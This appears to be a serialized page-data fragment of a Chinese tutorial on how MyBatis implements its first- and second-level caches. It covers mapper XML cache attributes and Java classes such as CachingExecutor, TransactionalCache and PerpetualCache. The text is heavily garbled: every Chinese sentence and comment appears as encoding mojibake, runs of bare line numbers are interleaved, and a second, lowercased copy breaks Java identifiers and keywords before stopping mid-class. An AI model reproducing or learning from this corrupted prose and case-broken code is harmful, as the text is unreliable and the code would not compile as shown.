--\x3e\n<mapper namespace="com.example.MyMapper">\n    \x3c!-- è®¾ç½®è¯¥mapperçäºçº§ç¼å­ --\x3e\n    <cache eviction="LRU" flushInterval="100000" readOnly="true" size="1024"/>\n    \x3c!-- useCacheï¼è¡¨ç¤ºæ¯å¦ä½¿ç¨äºçº§ç¼å­ï¼å¦æè®¾ç½®ä¸º trueï¼åä¼ä½¿ç¨äºçº§ç¼å­ãå¯¹äº select åç´ ï¼é»è®¤å¼ä¸º trueã --\x3e\n    \x3c!-- useCache å±æ§åªè½æ§å¶æ¯å¦ä½¿ç¨äºçº§ç¼å­ï¼å®ä¸è½å³é­ä¸çº§ç¼å­ãä¸çº§ç¼å­æ¯ MyBatis çé»è®¤è¡ä¸ºï¼å®æ»æ¯å¼å¯çï¼æ æ³å³é­ã --\x3e\n    <select id="queryActivityById" parameterType="cn.bugstack.mybatis.test.po.Activity" flushCache="false" useCache="true">\n        SELECT activity_id, activity_name, activity_desc, create_time, update_time\n        FROM activity\n        <trim prefix="where" prefixOverrides="AND | OR" suffixOverrides="and">\n            <if test="null != activityId">\n                activity_id = #{activityId}\n            </if>\n        </trim>\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nå¶ä¸­ <cache > æ ç­¾æå¤ä¸ªå±æ§ï¼è¿éä¸ä¸ä»ç»ä¸ä¸ï¼\n\n * typeï¼å¯ä»¥æå®èªå®ä¹ç¼å­ï¼ä½æ¯è¯¥ç±»å¿é¡»å®ç°ï¼èä¸æ¯å¨ç±»å\n * evictionï¼ç¼å­åæ¶ç­ç¥ï¼é»è®¤ä¸º LRUï¼Least Recently Usedï¼ï¼ç­ç¥ä»ç»å¦ä¸ï¼\n   LRUï¼æç§è®¿é®æ¶é´æåºï¼æè¿æªä½¿ç¨çæ°æ®ä¼åæ¸é¤ã\n   FIFOï¼æç§æå¥æ¶é´æåºï¼åæå¥çæ°æ®åæ¸é¤ã\n   SOFTï¼åºäºåå¾åæ¶ç®æ³ï¼å½ç³»ç»åå­ä¸è¶³æ¶ï¼ä¼ä¼åæ¸çä¸å¸¸ç¨çãå ç¨åå­è¾å¤çæ°æ®ã\n   WEAKï¼å¼±å¼ç¨æºå¶ï¼å½ JVM è¿è¡åå¾åæ¶æ¶ï¼å¦æå¤æ­ä¸ä¸ªå¯¹è±¡åªè¢«å¼±å¼ç¨æåï¼åä¼å°å¶åæ¶ã\n * flushIntervalï¼å·æ°é´éæ¶é´ï¼è¡¨ç¤ºå¤é¿æ¶é´å·æ°ä¸æ¬¡ç¼å­ï¼åä½ä¸ºæ¯«ç§ï¼é»è®¤ä¸å·æ°ã\n * sizeï¼ç¼å­çå¤§å°ï¼è¡¨ç¤ºæå¤å¯ä»¥ç¼å­å¤å°ä¸ªå¯¹è±¡ã\n * readOnlyï¼æ¯å¦åªè¯»ï¼é»è®¤ä¸º falseï¼è¡¨ç¤ºå¯ç¨ç¼å­æ´æ°æºå¶ã\n * blockingï¼æ¯å¦å¯ç¨é»å¡ï¼é»è®¤ä¸º falseï¼è¡¨ç¤ºä¸å¯ç¨ã\n\n> flushInterval é»è®¤æåµä¸ï¼MyBatis éç¨åºäº PerpetualCache (æ°¸ä¹ç¼å­) çç¼å­å®ç°æ¹å¼ï¼å³ç¼å­ä¼ä¸ç´ä¿å­å¨åå­ä¸­ï¼ç´å°ä¼è¯å³é­æ¶æè¢«æ¸é¤ãèå½æä»¬ä½¿ç¨åºäº Ehcache çç¼å­å®ç°æ¶ï¼å¯ä»¥éè¿è®¾ç½® flushInterval å±æ§æ§å¶ç¼å­çå·æ°æ¶é´ï¼å³å®æ¶å°ç¼å­ä¸­çæ°æ®åå¥å°ç£çææä¹åå­å¨ä¸­ï¼ä»¥é¿åç¼å­è¿æãå¤±ææåå­æº¢åºç­é®é¢ã\n\nå½ Mybaits å¯å¨åä¼è¯»å°äºçº§ç¼å­çéç½®ï¼åä¼è¿è¡ <cache> åºç¡çè§£æï¼å¾å° XML éé¢çå±æ§å¼ï¼å¶æ¬¡ç¨å¼ä¿¡æ¯ç»æä¸ä¸ª Cache å¯¹è±¡ï¼å¹¶æè¿ä¸ª Cache å¯¹è±¡ç»´æ¤å°å¨å±éç½® Configuration ä¸­ï¼è¯¥å¨å±éç½®éé¢æ¯ç»´æ¤ä¸ä¸ª Map ç»æçå®¹å¨\n\n// å¼å§è§£æ\nprivate void cacheElement(Element context) {\n    if (context == null) return;\n    // åºç¡éç½®ä¿¡æ¯ï¼é»è®¤æ¯æ°¸æç¼å­\n    String type = context.attributeValue("type", "PERPETUAL");\n    Class<? extends Cache> typeClass = typeAliasRegistry.resolveAlias(type);\n    // ç¼å­éå FIFO\n    String eviction = context.attributeValue("eviction", "FIFO");\n    Class<? extends Cache> evictionClass = typeAliasRegistry.resolveAlias(eviction);\n    Long flushInterval = Long.valueOf(context.attributeValue("flushInterval"));\n    Integer size = Integer.valueOf(context.attributeValue("size"));\n    boolean readWrite = !Boolean.parseBoolean(context.attributeValue("readOnly", "false"));\n    boolean blocking = !Boolean.parseBoolean(context.attributeValue("blocking", "false"));\n\n    // è§£æé¢å¤å±æ§ä¿¡æ¯ï¼<property name="cacheFile" value="/tmp/xxx-cache.tmp"/>\n    List<Element> elements = context.elements();\n    Properties props = new Properties();\n    for (Element element : elements) {\n        props.setProperty(element.attributeValue("name"), element.attributeValue("value"));\n    }\n    // æå»ºç¼å­\n    builderAssistant.useNewCache(typeClass, evictionClass, flushInterval, size, readWrite, blocking, props);\n}\n\n// æå»ºCache\npublic Cache useNewCache(Class<? extends Cache> typeClass,\n                        Class<? extends Cache> evictionClass,\n                        Long flushInterval,\n                        Integer size,\n                        boolean readWrite,\n                        boolean blocking,\n                        Properties props) {\n    // å¤æ­ä¸ºnullï¼åç¨é»è®¤å¼\n    typeClass = valueOrDefault(typeClass, PerpetualCache.class);\n    evictionClass = valueOrDefault(evictionClass, FifoCache.class);\n\n    // å»ºé èæ¨¡å¼æå»º Cache [currentNamespace=cn.bugstack.mybatis.test.dao.IActivityDao]\n    Cache cache = new CacheBuilder(currentNamespace)\n            .implementation(typeClass)\n            .addDecorator(evictionClass)\n            .clearInterval(flushInterval)\n            .size(size)\n            .readWrite(readWrite)\n            .blocking(blocking)\n            .properties(props)\n            .build();\n\n    // æ·»å ç¼å­\n    configuration.addCache(cache);\n    // ç»èªå·±ç»´æ¤ä¸ä¸ª cache ä»¥ä¾¿åç»­ MappedStatement ç¨å°\n    currentCache = cache;\n    return cache;\n}\n\n// æ·»å å° configurationå¨å±éç½®ç»´æ¤ç cachesä¸­\npublic class Configuration {\n    // ç¼å­,å­å¨Mapé\n    protected final Map<String, Cache> caches = new HashMap<>();\n    public void addCache(Cache cache) {\n        caches.put(cache.getId(), cache);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\nç¼å­è§£æè¿äºï¼ä½æ¯æä¸»è¦çè¿æ¯ <select> æ ç­¾çä¸äºï¼æ ç­¾ä¸é¢æè¿°äºå·ä½çç¼å­æ¯å¦ä½¿ç¨ï¼ç¼å­æ¯å¦æ¸é¤ï¼æä»¥è¿éè¦è§£ææ ç­¾ä¸çç¼å­ä¿¡æ¯ï¼ä¸»è¦æ¯ flushCache å useCache è¿ä¸¤ä¸ªå±æ§\n\n// è§£ææä½\npublic void parseStatementNode() {\n    String id = element.attributeValue("id");\n    // åæ°ç±»å\n    String parameterType = element.attributeValue("parameterType");\n    Class<?> parameterTypeClass = resolveAlias(parameterType);\n    // å¤é¨åºç¨ resultMap\n    String resultMap = element.attributeValue("resultMap");\n    // ç»æç±»å\n    String resultType = element.attributeValue("resultType");\n    Class<?> resultTypeClass = resolveAlias(resultType);\n    // è·åå½ä»¤ç±»å(select|insert|update|delete)\n    String nodeName = element.getName();\n    SqlCommandType sqlCommandType = SqlCommandType.valueOf(nodeName.toUpperCase(Locale.ENGLISH));\n\n    boolean isSelect = sqlCommandType == SqlCommandType.SELECT;\n    boolean flushCache = Boolean.parseBoolean(element.attributeValue("flushCache", String.valueOf(!isSelect)));\n    boolean useCache = Boolean.parseBoolean(element.attributeValue("useCache", String.valueOf(isSelect)));\n\n    // è·åé»è®¤è¯­è¨é©±å¨å¨\n    Class<?> langClass = configuration.getLanguageRegistry().getDefaultDriverClass();\n    LanguageDriver langDriver = configuration.getLanguageRegistry().getDriver(langClass);\n\n    // è§£æ<selectKey> step-14 æ°å¢\n    processSelectKeyNodes(id, parameterTypeClass, langDriver);\n\n    // è§£ææSqlSourceï¼DynamicSqlSource/RawSqlSource\n    SqlSource sqlSource = langDriver.createSqlSource(configuration, element, parameterTypeClass);\n\n    // å±æ§æ è®°ãä»å¯¹ insert æç¨ã, MyBatis ä¼éè¿ getGeneratedKeys æèéè¿ insert è¯­å¥ç selectKey å­åç´ è®¾ç½®å®çå¼ step-14 æ°å¢\n    String keyProperty = element.attributeValue("keyProperty");\n\n    KeyGenerator keyGenerator = null;\n    String keyStatementId = id + SelectKeyGenerator.SELECT_KEY_SUFFIX;\n    keyStatementId = builderAssistant.applyCurrentNamespace(keyStatementId, true);\n\n    if (configuration.hasKeyGenerator(keyStatementId)) {\n        keyGenerator = configuration.getKeyGenerator(keyStatementId);\n    } else {\n        keyGenerator = configuration.isUseGeneratedKeys() && SqlCommandType.INSERT.equals(sqlCommandType) ? new Jdbc3KeyGenerator() : new NoKeyGenerator();\n    }\n    // è°ç¨å©æç±»\n    builderAssistant.addMappedStatement(id,\n            sqlSource,\n            sqlCommandType,\n            parameterTypeClass,\n            resultMap,\n            resultTypeClass,\n            flushCache,\n            useCache,\n            keyGenerator,\n            keyProperty,\n            langDriver);\n}\n\n// æä¿¡æ¯æ·»å å° MappedStatementå¯¹è±¡\npublic MappedStatement addMappedStatement(\n        String id,\n        SqlSource sqlSource,\n        SqlCommandType sqlCommandType,\n        Class<?> parameterType,\n        String resultMap,\n        Class<?> resultType,\n        boolean flushCache,\n        boolean useCache,\n        KeyGenerator keyGenerator,\n        String keyProperty,\n        LanguageDriver lang\n) {\n    // ç»idå ä¸namespaceåç¼ï¼cn.bugstack.mybatis.test.dao.IUserDao.queryUserInfoById\n    id = applyCurrentNamespace(id, false);\n    //æ¯å¦æ¯selectè¯­å¥\n    boolean isSelect = sqlCommandType == SqlCommandType.SELECT;\n\n    MappedStatement.Builder statementBuilder = new MappedStatement.Builder(configuration, id, sqlCommandType, sqlSource, resultType);\n    statementBuilder.resource(resource);\n    statementBuilder.keyGenerator(keyGenerator);\n    statementBuilder.keyProperty(keyProperty);\n\n    // ç»ææ å°ï¼ç» MappedStatement#resultMaps\n    setStatementResultMap(resultMap, resultType, statementBuilder);\n    // ç»´æ¤ç¼å­ä¿¡æ¯\n    setStatementCache(isSelect, flushCache, useCache, currentCache, statementBuilder);\n    MappedStatement statement = statementBuilder.build();\n    // æ å°è¯­å¥ä¿¡æ¯ï¼å»ºé å®å­æ¾å°éç½®é¡¹ä¸­\n    configuration.addMappedStatement(statement);\n    return statement;\n}\n\n// ç»Statementæ·»å ç¼å­ä¿¡æ¯\nprivate void setStatementCache(\n        boolean isSelect,\n        boolean flushCache,\n        boolean useCache,\n        Cache cache,\n        MappedStatement.Builder statementBuilder) {\n    flushCache = valueOrDefault(flushCache, !isSelect);\n    useCache = valueOrDefault(useCache, isSelect);\n    statementBuilder.flushCacheRequired(flushCache);\n    statementBuilder.useCache(useCache);\n    statementBuilder.cache(cache);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n\n\nå¨å·ä½ç addMappedStatement çæ¶åï¼å¯ä»¥çå°ä¼å¾å°ä¸ä¸ª MappedStatement å¯¹è±¡ï¼è¯¥å¯¹è±¡å°±æ¯å°è£äº SQL æ ç­¾çææä¿¡æ¯ï¼å¨ setStatementCache æ¹æ³ä¸­ï¼ä¸ä»åªæ flushCacheåuseCache è¿è¡äºè®¾ç½®ï¼é¢å¤çè¿å¸¦æä¸ä¸ª cache ï¼è¯¥ cache å°±æ¯å¨è°ç¨ useNewCache æ¹æ³ï¼åé¨èµå¼ç currentCache ï¼ä»ä»¬çæ¹æ³æ¯å¨åä¸ä¸ªç±»ä¸­ï¼å æ­¤å¯ä»¥ä½¿ç¨ãè¿æ · MappedStatement å¯¹è±¡ä¹å°±æ¥æäº <cache> æ ç­¾çè½åï¼å°æ­¤è§£æå®æ¯\n\n\n# åå¤\n\nåä¸çº§ç¼å­ä¸æ ·ï¼é½æ¯å¨ openSession çæ¶åå»åå®ä¾åï¼ä½æ¯ä¸åçæ¯ï¼äºçº§ç¼å­ä¼å¨ä¸çº§ç¼å­ä¸è¿è¡ä¸ä¸ªè£é¥°ï¼å¹¶ä¸é¦è¦ä¼å¤æ­æ¯å¦åè®¸å¼å¯äºçº§ç¼å­ã\n\nif (cacheEnabled) {\n    executor = new CachingExecutor(executor);\n}\n\n\n1\n2\n3\n\n\nCachingExecutor æ¥æ¶ executor ï¼å¹¶å¯¹å¶è¿è¡åè£ï¼åé¨æ¹æ³ä¾ç¶è°ç¨çæ¯ BaseExecutor çç¸å³æ¹æ³ã CachingExecutor åé¨è¿ç»´æ¤äº TransactionalCacheManager äºå¡ç¼å­ç®¡çå¨ï¼è¯¥ç®¡çå¨åé¨ç»´æ¤ Map<Cache, TransactionalCache> ï¼ TransactionalCache åé¨åç»´æ¤äº Cache ä»¥å entriesMissedInCache å entriesToAddOnCommit\n\n\n# æ§è¡\n\npublic class CachingExecutor implements Executor {\n\n    private Logger logger = LoggerFactory.getLogger(CachingExecutor.class);\n    private Executor delegate;\n    // äºå¡ç¼å­ç®¡çå¨\n    private TransactionalCacheManager tcm = new TransactionalCacheManager();\n\n    public CachingExecutor(Executor delegate) {\n        this.delegate = delegate;\n        delegate.setExecutorWrapper(this);\n    }\n\n    @Override\n    public int update(MappedStatement ms, Object parameter) throws SQLException {\n        return delegate.update(ms, parameter);\n    }\n\n    @Override\n    public <E> List<E> query(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, CacheKey key, BoundSql boundSql) throws SQLException {\n        Cache cache = ms.getCache();\n        if (cache != null) {\n            flushCacheIfRequired(ms);\n            if (ms.isUseCache() && resultHandler == null) {\n                @SuppressWarnings("unchecked")\n                List<E> list = (List<E>) tcm.getObject(cache, key);\n                if (list == null) {\n                    list = delegate.<E>query(ms, parameter, rowBounds, resultHandler, key, boundSql);\n                    // cacheï¼ç¼å­éåå®ç°ç±»ï¼FIFO\n                    // keyï¼åå¸å¼ [mappedStatementId + offset + limit + SQL + queryParams + environment]\n                    // listï¼æ¥è¯¢çæ°æ®\n                    tcm.putObject(cache, key, list);\n                }\n                // æå°è°è¯æ¥å¿ï¼è®°å½äºçº§ç¼å­è·åæ°æ®\n                if (logger.isDebugEnabled() && cache.getSize() > 0) {\n                    logger.debug("äºçº§ç¼å­ï¼{}", JSON.toJSONString(list));\n                }\n                return list;\n            }\n        }\n        return delegate.<E>query(ms, parameter, rowBounds, resultHandler, key, boundSql);\n    }\n\n    @Override\n    public <E> List<E> query(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler) throws SQLException {\n        // 1. è·åç»å®SQL\n        BoundSql boundSql = ms.getBoundSql(parameter);\n        // 2. åå»ºç¼å­Key\n        CacheKey key = createCacheKey(ms, parameter, rowBounds, boundSql);\n        return query(ms, parameter, rowBounds, resultHandler, key, boundSql);\n    }\n\n    @Override\n    public Transaction getTransaction() {\n        return delegate.getTransaction();\n    }\n\n    @Override\n    public void commit(boolean required) throws SQLException {\n        delegate.commit(required);\n        tcm.commit();\n    }\n\n    @Override\n    public void rollback(boolean required) throws SQLException {\n        try {\n            delegate.rollback(required);\n        } finally {\n            if (required) {\n                tcm.rollback();\n            }\n        }\n    }\n\n    @Override\n    public void close(boolean forceRollback) {\n        try {\n            if (forceRollback) {\n                tcm.rollback();\n            } else {\n                tcm.commit();\n            }\n        } finally {\n            delegate.close(forceRollback);\n        }\n    }\n\n    @Override\n    public void clearLocalCache() {\n        delegate.clearLocalCache();\n    }\n\n    @Override\n    public CacheKey createCacheKey(MappedStatement ms, Object parameterObject, RowBounds rowBounds, BoundSql boundSql) {\n        return delegate.createCacheKey(ms, parameterObject, rowBounds, boundSql);\n    }\n\n    @Override\n    public void setExecutorWrapper(Executor executor) {\n        throw new UnsupportedOperationException("This method should not be called");\n    }\n\n    private void flushCacheIfRequired(MappedStatement ms) {\n        Cache cache = ms.getCache();\n        if (cache != null && ms.isFlushCacheRequired()) {\n            tcm.clear(cache);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n\n\npublic class TransactionalCacheManager {\n\n    private Map<Cache, TransactionalCache> transactionalCaches = new HashMap<>();\n\n    public void clear(Cache cache) {\n        getTransactionalCache(cache).clear();\n    }\n\n    /**\n     * å¾å°æä¸ªTransactionalCacheçå¼\n     */\n    public Object getObject(Cache cache, CacheKey key) {\n        return getTransactionalCache(cache).getObject(key);\n    }\n\n    public void putObject(Cache cache, CacheKey key, Object value) {\n        getTransactionalCache(cache).putObject(key, value);\n    }\n\n    /**\n     * æäº¤æ¶å¨é¨æäº¤\n     */\n    public void commit() {\n        for (TransactionalCache txCache : transactionalCaches.values()) {\n            txCache.commit();\n        }\n    }\n\n    /**\n     * åæ»æ¶å¨é¨åæ»\n     */\n    public void rollback() {\n        for (TransactionalCache txCache : transactionalCaches.values()) {\n            txCache.rollback();\n        }\n    }\n\n    private TransactionalCache getTransactionalCache(Cache cache) {\n        TransactionalCache txCache = transactionalCaches.get(cache);\n        if (txCache == null) {\n            txCache = new TransactionalCache(cache);\n            transactionalCaches.put(cache, txCache);\n        }\n        return txCache;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\npublic class TransactionalCache implements Cache {\n\n    private Cache delegate;\n    // commit æ¶è¦ä¸è¦æ¸ç¼å­\n    private boolean clearOnCommit;\n    // commit æ¶è¦æ·»å çåç´ \n    private Map<Object, Object> entriesToAddOnCommit;\n    private Set<Object> entriesMissedInCache;\n\n    public TransactionalCache(Cache delegate) {\n        // delegate = FifoCache\n        this.delegate = delegate;\n        // é»è®¤ commit æ¶ä¸æ¸ç¼å­\n        this.clearOnCommit = false;\n        this.entriesToAddOnCommit = new HashMap<>();\n        this.entriesMissedInCache = new HashSet<>();\n    }\n\n    @Override\n    public String getId() {\n        return delegate.getId();\n    }\n\n    @Override\n    public int getSize() {\n        return delegate.getSize();\n    }\n\n    @Override\n    public Object getObject(Object key) {\n        // keyï¼CacheKey æ¼è£åçåå¸ç \n        Object object = delegate.getObject(key);\n        if (object == null) {\n            entriesMissedInCache.add(key);\n        }\n        return clearOnCommit ? null : object;\n    }\n\n    @Override\n    public void putObject(Object key, Object object) {\n        entriesToAddOnCommit.put(key, object);\n    }\n\n    @Override\n    public Object removeObject(Object key) {\n        return null;\n    }\n\n    @Override\n    public void clear() {\n        clearOnCommit = true;\n        entriesToAddOnCommit.clear();\n    }\n\n    public void commit() {\n        if (clearOnCommit) {\n            delegate.clear();\n        }\n        flushPendingEntries();\n        reset();\n    }\n\n    public void rollback() {\n        unlockMissedEntries();\n        reset();\n    }\n\n    private void reset() {\n        clearOnCommit = false;\n        entriesToAddOnCommit.clear();\n        entriesMissedInCache.clear();\n    }\n\n    /**\n     * å·æ°æ°æ®å° MappedStatement#Cache ä¸­ï¼ä¹å°±æ¯ææ°æ®å¡«åå° Mapper XML çº§å«ä¸ã\n     * flushPendingEntries æ¹æ³æäºå¡ç¼å­ä¸çæ°æ®ï¼å¡«åå° FifoCache ä¸­ã\n     */\n    private void flushPendingEntries() {\n        for (Map.Entry<Object, Object> entry : entriesToAddOnCommit.entrySet()) {\n            delegate.putObject(entry.getKey(), entry.getValue());\n        }\n        for (Object entry : entriesMissedInCache) {\n            if (!entriesToAddOnCommit.containsKey(entry)) {\n                delegate.putObject(entry, null);\n            }\n        }\n    }\n\n    private void unlockMissedEntries() {\n        for (Object entry : entriesMissedInCache) {\n            delegate.putObject(entry, null);\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n\n\nå¶å®ä¸é¢é¥¶äºä¸åä¸æ¥ï¼æç»æä½çæ¯ MappedStatement ç»´æ¤ç Cache å¯¹è±¡ï¼ MappedStatement æ¯è¢«å¨å± Configuration å¨ç¼å­çï¼æä»¥æ¥è¯¢ç»æä¸ä¼æ¸é¤ MappedStatement å¯¹è±¡åç¼å­ä¿¡æ¯ï¼åªæå½è§¦å updateï¼commitï¼rollback ç­æä¼æ¸é¤ MappedStatement éç»´æ¤çç¼å­ä¿¡æ¯',normalizedContent:'mybatis çç¼å­åä¸ºä¸çº§ç¼å­åäºçº§ç¼å­ï¼ç¼å­æåµå¦ä¸å¾ï¼åæå¡æ¶æä¸­ï¼æä¸ä»æåªæä¸ä¸ªç¨åºæä¾ç¸åæå¡ï¼ï¼ä¸çº§ç¼å­å¼å¯ä¸ä¼å½±åä¸å¡ï¼åªä¼æé«æ§è½ã å¾®æå¡æ¶æä¸­éè¦å³é­ä¸çº§ç¼å­ï¼åå ï¼service1 åæ¥è¯¢æ°æ®ï¼è¥ä¹å service2 ä¿®æ¹äºæ°æ®ï¼ä¹å service1 ååæ¬¡ä»¥åæ ·çæ¥è¯¢æ¡ä»¶æ¥è¯¢æ°æ®ï¼å èµ°ç¼å­ä¼åºç°æ¥å¤çæ°æ®ä¸æ¯ææ°æ°æ®\n\n\n\n\n# ä¸çº§ç¼å­\n\nä¸çº§ç¼å­æ¯åºäº sqlsession çº§å«çï¼å¨åä¸ä¸ª session çç¸åæ¥è¯¢è¯­å¥ä¼æä¼ä»ç¼å­ä¸­æ¥è¯¢ï¼æè°ç¸ååæ¬ sql ç¸åï¼æ¡ä»¶ç¸åç­ï¼é£ä¹æä»¬çä¸å¨æºç ä¸­å·ä½æ¯æä¹ç»´æ¤åä½¿ç¨è¿ä¸ªç¼å­çã\n\n\n# è§£æ\n\næè¿°ä¸çº§ç¼å­åªéè¦å¨ <configuration> æ ç­¾ä¸­æè¿°å³å¯ï¼èä¸çº§ç¼å­ç value å¼æ session å statement ä¸¤ç§ï¼å¦æè®¾ç½®ä¸º statement åºæ¬å¯ä»¥ç®æ¯å³é­ä¸çº§ç¼å­ï¼ä¸çº§ç¼å­æ¯ mybatis æä¾çé»è®¤ç¼å­ï¼æä»¥ä¸ä¼å¨ä»£ç ä¸­çå°å¤æ­ä¸çº§ç¼å­çæ¡ä»¶\n\n<configuration>\n    <settings>\n        \x3c!--ç¼å­çº§å«ï¼session/statement--\x3e\n        <setting name="localcachescope" value="session"/>\n    </settings>\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n\n\nè§£ææ ¸å¿ä»£ç ä¼å¾å° localcachescopeçå¼ ï¼ç»´æ¤å° configuration å¨å±éç½®ä¸­\n\nprivate void settingselement(element context) {\n    if (context == null) return;\n    list<element> elements = context.elements();\n    properties props = new properties();\n    for (element element : elements) {\n        props.setproperty(element.attributevalue("name"), element.attributevalue("value"));\n    }\n    // æ¯å¦å¯ç¨äºçº§ç¼å­\n    configuration.setcacheenabled(booleanvalueof(props.getproperty("cacheenabled"), true));\n    // ä¸çº§ç¼å­çéç½®\n    configuration.setlocalcachescope(localcachescope.valueof(props.getproperty("localcachescope")));\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# åå¤\n\nåå¤é¶æ®µä¸»è¦æ¯å¨ opensession æ¹æ³ï¼ä»ä¼å¨æ§è¡å¨éé¢å»ç´æ¥ new perpetualcache æ°¸ä¹ç¼å­ï¼æ§è¡å¨å°±æ¥æäºè¿ä¸ªç¼å­å¯¹è±¡\n\n// æå¼ä¸ä¸ª session\n@override\npublic sqlsession opensession() {\n    transaction tx = null;\n    try {\n        final environment environment = configuration.getenvironment();\n        transactionfactory transactionfactory = environment.gettransactionfactory();\n        tx = transactionfactory.newtransaction(configuration.getenvironment().getdatasource(), transactionisolationlevel.read_committed, false);\n        // åå»ºæ§è¡å¨\n        final executor executor = configuration.newexecutor(tx);\n        // åå»ºdefaultsqlsession\n        return new defaultsqlsession(configuration, executor);\n    } catch (exception e) {\n        try {\n            assert tx != null;\n            tx.close();\n        } catch (sqlexception ignore) {\n        }\n        throw new runtimeexception("error opening session.  cause: " + e);\n    }\n}\n\n// åå»ºæ§è¡å¨\npublic executor newexecutor(transaction transaction) {\n    executor executor = new simpleexecutor(this, transaction);\n    // éç½®å¼å¯äºçº§ç¼å­ï¼åå»º cachingexecutor(é»è®¤å°±æ¯æç¼å­)è£é¥°èæ¨¡å¼ï¼\n    if (cacheenabled) {\n        executor = new cachingexecutor(executor);\n    }\n    return executor;\n}\n\n// simpleexecutor ç®åæ§è¡å¨çæé æ¹æ³\npublic class simpleexecutor extends baseexecutor {\n    public simpleexecutor(configuration configuration, transaction transaction) {\n        super(configuration, transaction);\n    }\n}\n\n// åºç¡æ§è¡å¨çæé æ¹æ³\nprotected baseexecutor(configuration configuration, transaction transaction) {\n    this.configuration = configuration;\n    this.transaction = transaction;\n    this.wrapper = this;\n    // new ä¸ä¸ªæ°¸ä¹ç¼å­\n    this.localcache = new perpetualcache("localcache");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\nperpetualcache ç»§æ¿äº cache ï¼å¹¶å®ç°äºåºæ¬çå¯¹ç¼å­çæä½\n\npublic class perpetualcache implements cache {\n    private string id;\n    // ä½¿ç¨hashmapå­æ¾ä¸çº§ç¼å­æ°æ®ï¼session çå½å¨æè¾ç­ï¼æ­£å¸¸æåµä¸æ°æ®ä¸ä¼ä¸ç´å¨ç¼å­å­æ¾\n    private map<object, object> cache = new hashmap<>();\n    public perpetualcache(string id) {\n        this.id = id;\n    }\n    @override\n    public string getid() {\n        return id;\n    }\n    @override\n    public void putobject(object key, object value) {\n        cache.put(key, value);\n    }\n    @override\n    public object getobject(object key) {\n        return cache.get(key);\n    }\n    @override\n    public object removeobject(object key) {\n        return cache.remove(key);\n    }\n    @override\n    public void clear() {\n        cache.clear();\n    }\n    @override\n    public int getsize() {\n        return cache.size();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# æ§è¡\n\nå¨åå¤é¶æ®µå·²ç»å¾å°äºæ§è¡å¨ï¼å¹¶å¨æ§è¡å¨éé¢å¾å°äº perpetualcache ç¼å­ï¼åªéè¦ç¥éå®¢æ·ä½¿ç¨çæ¯æ¥è¯¢è¿æ¯ä¿®æ¹ç­æä½åï¼æ§è¡æ§è¡å¨éé¢å¯¹åºç query or update æ¹æ³å³å¯\n\npublic abstract class baseexecutor implements executor {\n\n    private org.slf4j.logger logger = loggerfactory.getlogger(baseexecutor.class);\n\n    protected configuration configuration;\n    protected transaction transaction;\n    protected executor wrapper;\n\n    // æ¬å°ç¼å­\n    protected perpetualcache localcache;\n\n    private boolean closed;\n    // æ¥è¯¢å æ \n    protected int querystack = 0;\n\n    protected baseexecutor(configuration configuration, transaction transaction) {\n        this.configuration = configuration;\n        this.transaction = transaction;\n        this.wrapper = this;\n        